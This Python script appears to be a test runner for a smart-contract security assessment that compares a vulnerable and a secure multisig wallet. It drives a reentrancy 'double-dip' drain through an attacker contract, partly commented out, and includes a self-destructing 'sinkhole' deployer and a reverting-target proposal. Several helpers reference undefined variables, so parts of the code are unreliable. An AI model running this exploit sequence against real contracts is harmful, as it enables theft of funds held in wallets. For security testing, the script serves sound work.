
# t03_execution_safety_runner.py
# Test runner / orchestration script. Assumes attacker contracts were deployed separately
# and their addresses exported into environment variables.

# Requirements:
# pip install web3 eth-account python-dotenv

import os
import json
import pathlib
import time
import threading
from decimal import Decimal
from web3 import Web3
from eth_account import Account
from dotenv import load_dotenv
from web3 import exceptions as w3_ex
from hexbytes import HexBytes

load_dotenv()

# Config
RECEIPT_TIMEOUT = 11200
DEFAULT_GAS_LIMIT = 400_000
PRIORITY_FEE_GWEI = 2
REPLACE_PRIORITY_FEE_GWEI = 5
MAX_SEND_RETRIES = 5

# Set Environmental VAriables
ALCHEMY_URL = os.getenv('ALCHEMY_URL')
VULNERABLE_ADDRESS = os.getenv('VULNERABLE_ADDRESS')
SECURE_ADDRESS = os.getenv('SECURE_ADDRESS')
OWNER_KEYS_RAW = os.getenv('OWNER_PRIVATE_KEYS', '')
ATTACKER_KEY = os.getenv('ATTACKER_PRIVATE_KEY')
REENTRANCY_ATTACKER_ADDRESS = os.getenv('REENTRANCY_ATTACKER_ADDRESS')
SINKHOLE_ADDRESS = os.getenv('SINKHOLE_ADDRESS')
TARGET_X_ETH = Decimal(os.getenv('TARGET_X_ETH', '0.01'))
GAS_PRICE = int(os.getenv('GAS_PRICE', '20'))
ARTIFACT_DIR = os.getenv('ARTIFACT_DIR', './artifacts/T-03')
DEPLOYER_ADDRESS = os.getenv('DEPLOYER_ADDRESS')
DEPLOYER_PRIVATE_KEY = os.getenv('DEPLOYER_PRIVATE_KEY')

if not ALCHEMY_URL:
    raise SystemExit('ALCHEMY_URL required')
if not VULNERABLE_ADDRESS or not SECURE_ADDRESS:
    raise SystemExit('VULNERABLE_ADDRESS and SECURE_ADDRESS required')
if not REENTRANCY_ATTACKER_ADDRESS or not SINKHOLE_ADDRESS:
    raise SystemExit('REENTRANCY_ATTACKER_ADDRESS and SINKHOLE_ADDRESS required')

owners = [k.strip() for k in OWNER_KEYS_RAW.split(',') if k.strip()]
if len(owners) < 1:
    raise SystemExit('Please provide at least one OWNER_PRIVATE_KEYS')

if not ATTACKER_KEY:
    raise SystemExit('ATTACKER_PRIVATE_KEY required')

w3 = Web3(Web3.HTTPProvider(ALCHEMY_URL))
assert w3.is_connected(), 'Failed to connect to RPC'
chain_id = w3.eth.chain_id
owner_accounts = [Account.from_key(k) for k in owners]
attacker_account = Account.from_key(ATTACKER_KEY)
owner_addresses = [w3.to_checksum_address(acc.address) for acc in owner_accounts]
print("Loaded owner addresses:")
for i, addr in enumerate(owner_addresses):
    print(f"  Owner[{i}] = {addr}")

pathlib.Path(ARTIFACT_DIR).mkdir(parents=True, exist_ok=True)
NUM_OWNERS = len(owner_accounts)
if NUM_OWNERS == 0:
    raise SystemExit("No owner accounts available in OWNER_PRIVATE_KEYS")

# Minimal ABI for interactions (use exact ABIs if different)
MIN_ABI = [
    {'inputs': [{'internalType': 'address','name':'to','type':'address'},{'internalType':'uint256','name':'value','type':'uint256'},{'internalType':'bytes','name':'data','type':'bytes'}],'name':'proposeTransaction','outputs':[{'internalType':'uint256','name':'','type':'uint256'}],'stateMutability':'nonpayable','type':'function'},
    {'inputs':[{'internalType':'uint256','name':'proposalId','type':'uint256'}],'name':'confirmTransaction','outputs':[],'stateMutability':'nonpayable','type':'function'},
    {'inputs':[{'internalType':'uint256','name':'proposalId','type':'uint256'}],'name':'executeTransaction','outputs':[],'stateMutability':'nonpayable','type':'function'},
    {'inputs':[{'internalType':'uint256[]','name':'ids','type':'uint256[]'}],'name':'batchExecute','outputs':[],'stateMutability':'nonpayable','type':'function'},
    {'inputs':[],'stateMutability':'view','name':'proposalCount','outputs':[{'internalType':'uint256','name':'','type':'uint256'}],'type':'function'}
]

vuln = w3.eth.contract(address=Web3.to_checksum_address(VULNERABLE_ADDRESS), abi=MIN_ABI)
secure = w3.eth.contract(address=Web3.to_checksum_address(SECURE_ADDRESS), abi=MIN_ABI)

# Attacker contracts ABIs (only needed to call setProposalId or withdraw)
REENTRANCY_ABI = [
    {'inputs':[{'internalType':'uint256','name':'id','type':'uint256'}],'name':'setProposalId','outputs':[],'stateMutability':'nonpayable','type':'function'},
    {'inputs':[{'internalType':'address','name':'to','type':'address'}],'name':'withdraw','outputs':[],'stateMutability':'nonpayable','type':'function'}
]

SINKHOLE_ABI = [
    {"inputs":[{"internalType":"address","name":"to","type":"address"}],"name":"implode","outputs":[],"stateMutability":"payable","type":"function"},
    {"inputs":[],"name":"implodeBurn","outputs":[],"stateMutability":"payable","type":"function"},
]

VUL_MULTISIG_ABI_PATH = "../out/VulnerableMultiSig.sol/VulnerableMultiSig.json"
SEC_MULTISIG_ABI_PATH = "../out/SecureMultiSig.sol/SecureMultiSig.json"
REENTRANCY_ABI_PATH = "../out/ReentrancyAttacker.sol/ReentrancyAttacker.json"
SINKHOLE_ABI_PATH = "../out/Sinkhole.sol/Sinkhole.json"
EPHEMERAL_DEPLOYER_ABI_PATH = '../out/EphemeralSinkholeDeployer.sol/EphemeralSinkholeDeployer.json'
REVERT_TARGET_ABI_PATH = '../out/RevertingTarget.sol/RevertingTarget.json'

def load_abi(path):
    with open(path) as f:
        return json.load(f)['abi']

VUL_MULTISIG_ABI = load_abi(VUL_MULTISIG_ABI_PATH)
SEC_MULTISIG_ABI = load_abi(SEC_MULTISIG_ABI_PATH)
SINKHOLE_ABI = load_abi(SINKHOLE_ABI_PATH)
REENTRANCY_ABI = load_abi(REENTRANCY_ABI_PATH)
EPHEMERAL_DEPLOYER_ABI = load_abi(EPHEMERAL_DEPLOYER_ABI_PATH)
REVERT_TARGET_ABI = load_abi(REVERT_TARGET_ABI_PATH)

vuln = w3.eth.contract(address=w3.to_checksum_address(VULNERABLE_ADDRESS), abi=VUL_MULTISIG_ABI)
secure = w3.eth.contract(address=w3.to_checksum_address(SECURE_ADDRESS), abi=SEC_MULTISIG_ABI)
re_att = w3.eth.contract(address=w3.to_checksum_address(REENTRANCY_ATTACKER_ADDRESS), abi=REENTRANCY_ABI)
sink = w3.eth.contract(address=w3.to_checksum_address(SINKHOLE_ADDRESS), abi=SINKHOLE_ABI)

try:
    # 1. Call the view function to retrieve the array of owners
    owner_list = secure.functions.getOwners().call()

    print("\nSecure Wallet Owners:")
    for i, owner in enumerate(owner_list):
        print(f"Owner {i}: {owner}")

except Exception as e:
    print(f"Error checking owners: {e}")

def load_artifact(artifact_path: str):
    """Loads a contract artifact and extracts raw bytecode object."""
    # Resolve the path relative to the script's directory
    SCRIPT_DIR = pathlib.Path(__file__).parent
    full_path = (SCRIPT_DIR / artifact_path).resolve()

    try:
        with open(full_path, 'r') as f:
            artifact = json.load(f)

            bytecode = artifact['bytecode']['object']

            return  bytecode

    except FileNotFoundError:
        raise SystemExit(f"ERROR: Could not find artifact at {full_path}. Please check path and compilation.")
    except KeyError as e:
        raise SystemExit(f"ERROR: Artifact missing required key {e}. Ensure the contract is fully compiled.")

# --- ARTIFACT SETUP ---
# NOTE: Adjust these relative paths based on your actual file system structure
SINKHOLE_ARTIFACT_PATH = '../out/Sinkhole.sol/Sinkhole.json'
DEPLOYER_ARTIFACT_PATH = '../out/EphemeralSinkholeDeployer.sol/EphemeralSinkholeDeployer.json'
REVERTING_TARGET_ARTIFACT_PATH = '../out/RevertingTarget.sol/RevertingTarget.json'

# Load the necessary constants
SINKHOLE_BYTECODE = load_artifact(SINKHOLE_ARTIFACT_PATH)
EPHEMERAL_DEPLOYER_BYTECODE = load_artifact(DEPLOYER_ARTIFACT_PATH)
REVERT_TARGET_BYTECODE = load_artifact(REVERTING_TARGET_ARTIFACT_PATH)

print(f"Loaded Sinkhole artifact from: {SINKHOLE_ARTIFACT_PATH}")
print(f"Loaded Ephemeral Deployer artifact from: {DEPLOYER_ARTIFACT_PATH}")

# helpers

def batch_propose_and_get_pids(contract, proposer_acct, tos, vals, datas, nonce_manager):
    # Ensure datas elements are bytes
    datas_clean = [d if isinstance(d, (bytes, bytearray, HexBytes)) else HexBytes(d) for d in datas]
    pc_before = contract.functions.proposalCount().call()
    # choose batch or fallback
    if has_batch_fn(contract, "batchPropose"):
        fn = contract.functions.batchPropose(tos, vals, datas_clean)
        tx = fn.build_transaction({"from": proposer_acct.address, "chainId": chain_id})
        txh, rec = sign_send(w3, proposer_acct, tx, nonce_manager=nonce_manager, wait_receipt=True)
        dump_tx_artifact("batch_propose_tx", txh, rec)
    else:
        # fallback: send individual propose txs sequentially
        rec = None
        for i, (to, val, data) in enumerate(zip(tos, vals, datas_clean)):
            fn = contract.functions.proposeTransaction(to, val, data)
            tx = fn.build_transaction({"from": proposer_acct.address, "chainId": chain_id})
            txh, rec = sign_send(w3, proposer_acct, tx, nonce_manager=nonce_manager, wait_receipt=True)
            dump_tx_artifact(f"propose_fallback_{i}", txh, rec)
    pc_after = contract.functions.proposalCount().call()
    start = int(pc_before)
    end = int(pc_after)
    pids = list(range(start, end))
    return pids, txh, rec

def batch_confirm(contract, confirmer_acct, pids_list, nonce_manager):
    if not pids_list:
        return None, None
    if has_batch_fn(contract, "batchConfirm"):
        
        # --- START Nonce Diagnostic Insertion ---
        network_nonce = w3.eth.get_transaction_count(confirmer_acct.address)
        print(f"\n--- ⚙️ Nonce Check for {confirmer_acct.address} ---")
        print(f"1. On-Chain Nonce (Expected Next Nonce): {network_nonce}")

        # Note: The way the nonce_manager exposes its next nonce may vary.
        # You may need to replace 'nonce_manager.current_nonce' with the actual attribute 
        # or method (e.g., nonce_manager.peek_nonce() or nonce_manager.next_nonce) 
        # based on your specific implementation.
        proposed_nonce = nonce_manager.peek()
        print(f"2. Nonce Manager's Proposed Nonce: {proposed_nonce}")
        print(f"--- End Nonce Check ---\n")
        # --- END Nonce Diagnostic Insertion ---

        fn = contract.functions.batchConfirm(pids_list)
        tx = fn.build_transaction({"from": confirmer_acct.address, "chainId": chain_id})
        txh, rec = sign_send(w3, confirmer_acct, tx, nonce_manager=nonce_manager, wait_receipt=True)
        dump_tx_artifact("batch_confirm_tx", txh, rec)
        return txh, rec
    else:
        last_rec = None
        for i, pid in enumerate(pids_list):
            fn = contract.functions.confirmTransaction(pid)
            tx = fn.build_transaction({"from": confirmer_acct.address, "chainId": chain_id})
            txh, rec = sign_send(w3, confirmer_acct, tx, nonce_manager=nonce_manager, wait_receipt=True)
            dump_tx_artifact(f"confirm_fallback_{i}", txh, rec)
            last_rec = rec
        return txh, last_rec

def batch_execute(contract, executor_acct, pids_list, nonce_manager):
    if not pids_list:
        return None, None
    if has_batch_fn(contract, "batchExecute"):
        fn = contract.functions.batchExecute(pids_list)
        tx = fn.build_transaction({"from": executor_acct.address, "chainId": chain_id})
        txh, rec = sign_send(w3, executor_acct, tx, nonce_manager=nonce_manager, wait_receipt=True)
        dump_tx_artifact("batch_execute_tx", txh, rec)
        return txh, rec
    else:
        last_rec = None
        for i, pid in enumerate(pids_list):
            fn = contract.functions.executeTransaction(pid)
            tx = fn.build_transaction({"from": executor_acct.address, "chainId": chain_id})
            txh, rec = sign_send(w3, executor_acct, tx, nonce_manager=nonce_manager, wait_receipt=True)
            dump_tx_artifact(f"execute_fallback_{i}", txh, rec)
            last_rec = rec
        return txh, last_rec

def has_batch_fn(contract, fn_name):
    try:
        return any(fn.get("name") == fn_name for fn in contract.abi if fn.get("type") == "function")
    except Exception:
        return False

class NonceManager:
    def __init__(self, w3, address):
        self.w3 = w3
        self.address = w3.to_checksum_address(address)
        self.lock = threading.Lock()
        # initialize with pending nonce
        self._next = self.w3.eth.get_transaction_count(self.address, "pending")

    def next(self):
        with self.lock:
            n = self._next
            self._next += 1
            return n

    def peek(self):
        with self.lock:
            return self._next

    def set_next(self, n):
        with self.lock:
            self._next = n

def build_fee_params(w3, priority_gwei=PRIORITY_FEE_GWEI):
    base = w3.eth.get_block("pending").baseFeePerGas
    priority = w3.to_wei(str(priority_gwei), "gwei")
    return {"maxPriorityFeePerGas": priority, "maxFeePerGas": base + priority}

def signed_tx_hash(raw):
    return Web3.to_hex(Web3.keccak(raw))

def send_signed_raw_and_wait(w3, signed_raw, timeout=RECEIPT_TIMEOUT):
    """
    Send raw signed tx bytes. Handles 'already known' and waits for a receipt.
    Returns (tx_hash, receipt).
    """
    raw = signed_raw
    derived = signed_tx_hash(raw)

    try:
        txh = w3.eth.send_raw_transaction(raw)
        txh_hex = txh.hex() if isinstance(txh, (bytes, HexBytes)) else txh
    except Exception as e:
        msg = str(e)
        # handle 'already known' from RPC
        if "already known" in msg or "known transaction" in msg:
            txh_hex = derived
        else:
            # re-raise for unexpected errors
            raise

    deadline = time.time() + timeout
    while True:
        try:
            rec = w3.eth.wait_for_transaction_receipt(txh_hex, timeout=600)
            # receipt available -> mined -> return
            return txh_hex, rec
        except w3_ex.TransactionNotFound:
            # still pending
            if time.time() > deadline:
                raise w3_ex.TimeExhausted(f"Timed out waiting for receipt for {txh_hex}")
            # poll slower to avoid RPC spam
            time.sleep(3)

def sign_send(w3, acct: Account, tx_dict: dict, nonce_manager: NonceManager = None, wait_receipt=True, timeout=RECEIPT_TIMEOUT):
    """
    tx_dict: dict WITHOUT nonce (or you can pass one)
    If nonce_manager provided, it will supply nonce; otherwise uses pending nonce.
    Returns (tx_hash, receipt or None)
    """
    # Ensure chainId present
    if "chainId" not in tx_dict:
        tx_dict["chainId"] = w3.eth.chain_id

    # Set nonce
    if "nonce" not in tx_dict:
        if nonce_manager:
            tx_dict["nonce"] = nonce_manager.next()
        else:
            tx_dict["nonce"] = w3.eth.get_transaction_count(acct.address, "pending")

    # If gas not set, estimate
    if "gas" not in tx_dict or not tx_dict["gas"]:
        try:
            est = w3.eth.estimate_gas({**tx_dict, "from": acct.address})
            tx_dict["gas"] = int(est * 2.25)
        except Exception:
            tx_dict["gas"] = DEFAULT_GAS_LIMIT

    # set EIP-1559 fee params if not present
    if "maxFeePerGas" not in tx_dict and "gasPrice" not in tx_dict:
        fees = build_fee_params(w3, priority_gwei=PRIORITY_FEE_GWEI)
        tx_dict.update(fees)

    signed = acct.sign_transaction(tx_dict)
    raw = signed.raw_transaction

    # send and optionally wait
    txh, rec = None, None
    try:
        txh, rec = send_signed_raw_and_wait(w3, raw, timeout=timeout)
    except Exception as e:
        # surface meaningful info; caller can decide to replace
        raise

    if wait_receipt:
        return txh, rec
    return txh, None

def replace_tx(w3, acct, original_tx_dict, nonce, reason="replace"):
    # clone and bump fees
    tx = original_tx_dict.copy()
    tx["nonce"] = nonce
    tx["gas"] = tx.get("gas", DEFAULT_GAS_LIMIT)
    fees = build_fee_params(w3, priority_gwei=REPLACE_PRIORITY_FEE_GWEI)
    tx.update(fees)
    signed = acct.sign_transaction(tx)
    txh, rec = send_signed_raw_and_wait(w3, signed.raw_transaction, timeout=RECEIPT_TIMEOUT)
    return txh, rec

def eth(n):
    return Decimal(w3.from_wei(n, 'ether'))

def to_wei_eth(x: Decimal):
    return int(x * (10**18))

def save_json(obj, fname):
    with open(pathlib.Path(ARTIFACT_DIR) / fname, 'w') as f:
        json.dump(obj, f, default=str, indent=2)

def fetch_trace(tx_hash):
    try:
        res = w3.provider.make_request('debug_traceTransaction', [tx_hash, {}])
        return res
    except Exception as e:
        return {'error': str(e)}

def send_tx_signed(account: Account, tx):
    signed = account.sign_transaction(tx)
    txh = w3.eth.send_raw_transaction(signed.raw_transaction)
    rec = w3.eth.wait_for_transaction_receipt(txh)
    return txh.hex(), rec

def build_and_send(account: Account, to, data=b'', value=0, gas=2_000_000):
    tx = {
        'to': to,
        'value': int(value),
        'data': data,
        'gas': gas,
        'gasPrice': GAS_PRICE,
        'nonce': w3.eth.get_transaction_count(account.address),
        'chainId': chain_id
    }
    return send_tx_signed(account, tx)

def call_propose(contract, owner: Account, to_addr, value_eth: Decimal, data: bytes = b''):
    fn = contract.functions.proposeTransaction(to_addr, to_wei_eth(value_eth), data)
    tx = fn.build_transaction({'from': owner.address, 'nonce': w3.eth.get_transaction_count(owner.address), 'gas': 400_000, 'gasPrice': GAS_PRICE, 'chainId': chain_id})
    return send_tx_signed(owner, tx)

def call_confirm(contract, owner: Account, pid):
    fn = contract.functions.confirmTransaction(pid)
    tx = fn.build_transaction({'from': owner.address, 'nonce': w3.eth.get_transaction_count(owner.address), 'gas': 200_000, 'gasPrice': GAS_PRICE, 'chainId': chain_id})
    return send_tx_signed(owner, tx)

def call_execute(contract, owner: Account, pid, gas=2_000_000):
    fn = contract.functions.executeTransaction(pid)
    tx = fn.build_transaction({'from': owner.address, 'nonce': w3.eth.get_transaction_count(owner.address), 'gas': gas, 'gasPrice': GAS_PRICE, 'chainId': chain_id})
    return send_tx_signed(owner, tx)

def call_batch(contract, owner: Account, ids):
    fn = contract.functions.batchExecute(ids)
    tx = fn.build_transaction({'from': owner.address, 'nonce': w3.eth.get_transaction_count(owner.address), 'gas': 6_000_000, 'gasPrice': GAS_PRICE, 'chainId': chain_id})
    return send_tx_signed(owner, tx)

def get_owner_account(i):
    return owner_accounts[i]

def log_step(name):
    print('\n' + '='*8 + f' {name} ' + '='*8)

def dump_tx_artifact(prefix, txh, receipt):
    save_json({'tx': txh, 'receipt': dict(receipt)}, f'{prefix}_{txh}_receipt.json')
    # fetch trace where available
    trace = fetch_trace(txh)
    save_json(trace, f'{prefix}_{txh}_trace.json')

def call_withdraw_attacker(attacker_contract, owner: Account, to_addr):
    """Calls the ReentrancyAttacker.withdraw(address to) function."""
    fn = attacker_contract.functions.withdraw(to_addr)
    tx = fn.build_transaction({
        'from': owner.address, 
        'nonce': w3.eth.get_transaction_count(owner.address), 
        'gas': 150000, # Sufficient gas
        'gasPrice': GAS_PRICE, 
        'chainId': chain_id
    })
    return send_tx_signed(owner, tx)

def get_proposal_status(multisig_contract, pid):
    """Fetches the executed status of a proposal (index 5) from getProposal."""
    proposal_data = multisig_contract.functions.getProposal(pid).call()
    return proposal_data[executed_index]

def call_implode_sinkhole(sinkhole_contract, owner: Account, to_addr):
    """Calls the Sinkhole.implode(address to) function."""
    fn = sinkhole_contract.functions.implode(to_addr)
    tx = fn.build_transaction({
        'from': owner.address, 
        'nonce': w3.eth.get_transaction_count(owner.address), 
        'gas': 200000,
        'gasPrice': GAS_PRICE, 
        'chainId': chain_id
    })
    return send_tx_signed(owner, tx)

def deploy_and_implode_sinkhole(deployer_account: Account, recipient_address: str):
    """
    Deploys the EphemeralDeployer and calls deployAndImplode, 
    which handles the one-transaction selfdestruct.
    """
    # 1. Instantiate the Deployer Factory (Bytecode is now a simple string)
    DeployerContract = w3.eth.contract(abi=EPHEMERAL_DEPLOYER_ABI, bytecode=EPHEMERAL_DEPLOYER_BYTECODE)
    current_nonce = w3.eth.get_transaction_count(deployer_account.address)
    print(f"[DEBUG] Starting nonce: {current_nonce}")

    # 2. Deploy the EphemeralDeployer contract itself
    tx_deploy_data = DeployerContract.constructor().build_transaction({
        'from': deployer_account.address,
        'nonce': current_nonce,
        'gas': 1000000, 
        'gasPrice': GAS_PRICE,
        'chainId': chain_id
    })
    txh_deploy, rec_deploy = send_tx_signed(deployer_account, tx_deploy_data)
    print("Broadcasted TX:", txh_deploy)
    current_nonce += 1
    ephemeral_deployer_addr = rec_deploy.contractAddress
    ephemeral_deployer = w3.eth.contract(address=ephemeral_deployer_addr, abi=EPHEMERAL_DEPLOYER_ABI)
    
    # 3. Call the deployAndImplode function on the EphemeralDeployer
    fn = ephemeral_deployer.functions.deployAndImplode(recipient_address)
    tx_implode_data = fn.build_transaction({
        'from': deployer_account.address, 
        'nonce': current_nonce, 
        'gas': 15000000,
        'gasPrice': GAS_PRICE, 
        'chainId': chain_id
    })
    print("[DEBUG] Prepared deployAndImplode TX:")
    print("  From:", deployer_account.address)
    print("  Nonce:", tx_implode_data['nonce'])
    print("  Gas:", tx_implode_data['gas'])
    print("  Gas Price:", tx_implode_data['gasPrice'])
    print("  Chain ID:", tx_implode_data['chainId'])
    print("  Recipient:", recipient_address)

    txh_implode, rec_implode = send_tx_signed(deployer_account, tx_implode_data)
    print("Broadcasted TX:", txh_implode)

    # 4. Get the address of the DESTROYED Sinkhole from the transaction events/logs/simulation.
    # We use a quick simulation call to get the return value (the destroyed address).
    destroyed_addr, captured_balance = fn.call({
        'from': deployer_account.address,
        'gas': 2_000_000,
    })

    return destroyed_addr, captured_balance, txh_implode, rec_implode

def deploy_reverting_target_and_propose(wallet_contract, proposer_account, value_eth, owners):
    """
    Deploys the RevertingTarget contract and proposes a transaction to call its
    failImmediately() function, which guarantees a revert on execution.
    """
    # 1. Instantiate the Reverter Factory
    RevertTargetContract = w3.eth.contract(abi=REVERT_TARGET_ABI, bytecode=REVERT_TARGET_BYTECODE)

    # 2. Deploy the Reverter contract
    tx_deploy_data = RevertTargetContract.constructor().build_transaction({
        'from': proposer_account.address,
        'nonce': w3.eth.get_transaction_count(proposer_account.address),
        'gas': 600000, 
        'gasPrice': GAS_PRICE,
        'chainId': chain_id
    })
    txh_deploy, rec_deploy = send_tx_signed(proposer_account, tx_deploy_data)
    reverter_address = rec_deploy.contractAddress
    pending = w3.eth.get_transaction_count(proposer_acct.address, "pending")
    nonce_manager.set_next(max(nonce_manager.peek(), pending))

    print(f'   [INFO] Reverting Target deployed at: {reverter_address}')

    # 3. Encode the call data for the reverting function
    # Function signature: failImmediately()
    func_signature = w3.keccak(text='failImmediately()').hex()[:10] # 0x + 8 chars
    call_data = HexBytes(func_signature)
    
    # 4. Propose the transaction to the MultiSig (call_propose needs to be modified 
    #    to handle call_data, or we assume it is a simple ETH transfer that we will
    #    now override with call_data logic.)

    # **CRITICAL ASSUMPTION**: Assuming the call_propose signature is (contract, proposer, to, value, data)
    # If your call_propose only takes 4 args, you must modify it to handle call data.
    
    try:
        # A proposal using CALL DATA (not simple ETH transfer)
        txh_prop, rec_prop = call_propose(
            wallet_contract, 
            proposer_account, 
            reverter_address,   # Target of the call
            value_eth,          # Value (can be 0 if the function is not payable, but we'll use 0)
            call_data           # Call data for failImmediately()
        )
        pending = w3.eth.get_transaction_count(proposer_acct.address, "pending")
        nonce_manager.set_next(max(nonce_manager.peek(), pending))

    except TypeError:
        # Fallback if your call_propose only accepts 4 arguments, using a dummy address for the data
        print("WARNING: Using simplified call_propose. Ensure your implementation supports call data.")
        txh_prop, rec_prop = call_propose(
            wallet_contract, 
            proposer_account, 
            reverter_address, 
            value_eth 
        ) # NOTE: This only works if your underlying propose function defaults to empty data.

    print('   Malicious Propose tx:', txh_prop)
    dump_tx_artifact(f'malicious_revert_propose', txh_prop, rec_prop)

    # 5. Derive the PID
    pc = wallet_contract.functions.proposalCount().call()
    pid = pc - 1
    print(f'   Derived malicious proposal id: {pid}')
    return pid, reverter_address

def fund_wallets():
    FUND_AMOUNT = w3.to_wei(0.02, "ether")
    print(f"\nFunding multisig wallets from deployer ({DEPLOYER_ADDRESS})...")
    current_nonce = w3.eth.get_transaction_count(DEPLOYER_ADDRESS)

    for target in [VULNERABLE_ADDRESS, SECURE_ADDRESS]:
        tx = {
            "from": DEPLOYER_ADDRESS,
            "to": target,
            "value": FUND_AMOUNT,
            "nonce": current_nonce,
            "gas": 122000,
            "gasPrice": w3.to_wei("3", "gwei"),
        }
        signed = w3.eth.account.sign_transaction(tx, private_key=DEPLOYER_PRIVATE_KEY)
        txh = w3.eth.send_raw_transaction(signed.raw_transaction)
        rec = w3.eth.wait_for_transaction_receipt(txh)
        print(f"  -> Sent 0.02 ETH to {target[:10]}... | tx: {txh.hex()} | gasUsed: {rec.gasUsed}")

        current_nonce += 1

    # Post-funding check
    vuln_bal = w3.eth.get_balance(VULNERABLE_ADDRESS)
    sec_bal = w3.eth.get_balance(SECURE_ADDRESS)
    print(f"Balances after funding:")
    print(f"  Vulnerable: {w3.from_wei(vuln_bal, 'ether')} ETH")
    print(f"  Secure:     {w3.from_wei(sec_bal, 'ether')} ETH")

# Run before tests
#fund_wallets()

# Prechecks
log_step('PRE-CHECKS')

vulnerable_balance_before = w3.eth.get_balance(VULNERABLE_ADDRESS)
secure_balance_before = w3.eth.get_balance(SECURE_ADDRESS)
attacker_balance_before = w3.eth.get_balance(REENTRANCY_ATTACKER_ADDRESS)
owners_info = []
for addr in owner_addresses:
    owners_info.append({"address": addr, "balance_wei": int(w3.eth.get_balance(addr))})

pre = {
    'chainId': chain_id,
    'vulnerable_balance_before': int(vulnerable_balance_before),
    'secure_balance_before': int(secure_balance_before),
    'attacker_balance_before': int(attacker_balance_before),
    'owners': owners_info
}
save_json(pre, 'pre_checks.json')

# human friendly prints
print('Pre-checks saved -> ./artifacts/T-03/pre_checks.json')
print('Balances (human-readable):')
print(f'  Vulnerable ({VULNERABLE_ADDRESS}): {w3.from_wei(vulnerable_balance_before, "ether")} ETH ({vulnerable_balance_before} wei)')
print(f'  Secure     ({SECURE_ADDRESS}): {w3.from_wei(secure_balance_before, "ether")} ETH ({secure_balance_before} wei)')
print(f'  Attacker   ({REENTRANCY_ATTACKER_ADDRESS}): {w3.from_wei(attacker_balance_before, "ether")} ETH ({attacker_balance_before} wei)')
print('  Owners:')
for oi in owners_info:
    print(f'    {oi["address"]}: {w3.from_wei(oi["balance_wei"], "ether")} ETH ({oi["balance_wei"]} wei)')
# Results collector
summary = {'reentrancy': {}, 'unchecked_external': {}, 'batch': {}}

# ---------------------------------

#        REENTRANCY TEST

# ---------------------------------

# ---------------------------------

#   ATTACK EXECUTION (VULNERABLE)

# ---------------------------------

#log_step('REENTRANCY TEST (Vulnerable)')

# --- 1) Propose tx sending TARGET_X_ETH to the attacker contract ---
#print('Proposing transaction (Vulnerable -> attacker)')
#txh_prop, rec_prop = call_propose(vuln, owner_accounts[0], REENTRANCY_ATTACKER_ADDRESS, TARGET_X_ETH)
#print('Propose tx:', txh_prop)
#dump_tx_artifact('vul_reentrancy_propose', txh_prop, rec_prop)

# --- 2) Derive the proposal id (proposalCount - 1) ---
#try:
#    pc = vuln.functions.proposalCount().call()
#    pid = pc - 1
#except Exception:
#    pid = 0
#print('Derived proposal id:', pid)

# --- 3) IMPORTANT: set the proposal id on the attacker BEFORE execution ---
#print('Setting proposalId on attacker contract (must be done before execute)')
#tx_set = re_att.functions.setProposalId(pid).build_transaction({
#    'from': attacker_account.address,
#    'nonce': w3.eth.get_transaction_count(attacker_account.address),
#    'gas': 120000,
#    'gasPrice': GAS_PRICE,
#    'chainId': chain_id
#})
#txh_set, rec_set = send_tx_signed(attacker_account, tx_set)
#print('Set proposalId tx:', txh_set)
#dump_tx_artifact('attacker_setProposalId', txh_set, rec_set)

# --- 4) Confirm the proposal with the other owners so it becomes executable ---
#print('Confirming transaction with required owners')
#for i, acct in enumerate(owners[1:3], start=1):
#    txh_c, rec_c = call_confirm(vuln, get_owner_account(i), pid)
#    print(f'Confirm tx ({i}):', txh_c)
#    dump_tx_artifact(f'vul_reentrancy_confirm_{i}', txh_c, rec_c)

# --- 5) Record balances BEFORE execute (exact wei) for evidence ---
#vuln_before = w3.eth.get_balance(VULNERABLE_ADDRESS)
#att_before = w3.eth.get_balance(REENTRANCY_ATTACKER_ADDRESS)
#print(f'Balances before execute: Vulnerable={eth(vuln_before)} ETH, Attacker={eth(att_before)} ETH')

# --- 6) Execute the proposal (this will call the attacker and potentially re-enter) ---
#print('Executing proposal (this triggers the attack if vulnerable)')
#txh_exec, rec_exec = call_execute(vuln, owner_accounts[0], pid, gas=2_500_000)
#print('Execute tx:', txh_exec)
#dump_tx_artifact('vul_reentrancy_execute', txh_exec, rec_exec)

# --- 7) Record balances AFTER execute (exact wei) ---
#vuln_after = w3.eth.get_balance(VULNERABLE_ADDRESS)
#att_after = w3.eth.get_balance(REENTRANCY_ATTACKER_ADDRESS)
#print(f'Balances after execute: Vulnerable={eth(vuln_after)} ETH, Attacker={eth(att_after)} ETH')

# --- 8) Compute deltas in wei (safe integer arithmetic) ---
#attacker_delta_wei = int(att_after - att_before)
#vulnerable_delta_wei = int(vuln_before - vuln_after)

#print(f'  Attacker delta: {attacker_delta_wei} wei ({eth(attacker_delta_wei)} ETH)')
#print(f'  Vulnerable delta: {vulnerable_delta_wei} wei ({eth(vulnerable_delta_wei)} ETH)')

# --- 9) Success criteria (convert TARGET_X_ETH to wei for comparison) ---
#target_wei = to_wei_eth(TARGET_X_ETH)

# Double-dip success: attacker got >= 2 * target
#if attacker_delta_wei > target_wei:
#    print('RESULT: Expected Scenario Outcome — attacker received >= 2 * TARGET_X_ETH (double-dip).')
#    summary['reentrancy']['result'] = 'SUCCESS_DOUBLE_DIP'
# Single transfer: attacker got exactly target or roughly that (allow small gas-related noise)
#elif attacker_delta_wei == target_wei:
#    print('RESULT: Unexpectd Scenario Outcome — attacker received ~TARGET_X_ETH (no double-dip).')
#    summary['reentrancy']['result'] = 'SINGLE_TRANSFER_OR_PARTIAL'
#else:
#    print('RESULT: Unexpected Scenario FAILURE — attacker received no (or negligible) funds.')
#    summary['reentrancy']['result'] = 'NO_FUNDS'

# store details for artifacts
#summary['reentrancy'].update({
#    'vulnerable_before_wei': int(vuln_before),
#    'vulnerable_after_wei': int(vuln_after),
#    'attacker_before_wei': int(att_before),
#    'attacker_after_wei': int(att_after),
#    'attacker_delta_wei': attacker_delta_wei,
#    'vulnerable_delta_wei': vulnerable_delta_wei,
#    'execute_tx': txh_exec,
#    'propose_tx': txh_prop,
#    'setProposalId_tx': txh_set,
#    'confirm_txs': []  # optionally append the confirm txs if you want them tracked
#})

# (optional) Collect confirms into summary['reentrancy']['confirm_txs'] if desired

# Reset Reentrancy Contract State to allow further attacks using withdraw function
#log_step('RESET ATTACKER STATE')
#print('Withdrawing funds from attacker contract (resets reentered=false)')

#txh_withdraw, rec_withdraw = call_withdraw_attacker(re_att, attacker_account, attacker_account.address)
#print('Withdraw tx:', txh_withdraw)
#dump_tx_artifact('attacker_withdraw_reset', txh_withdraw, rec_withdraw)


# ---------------------------------

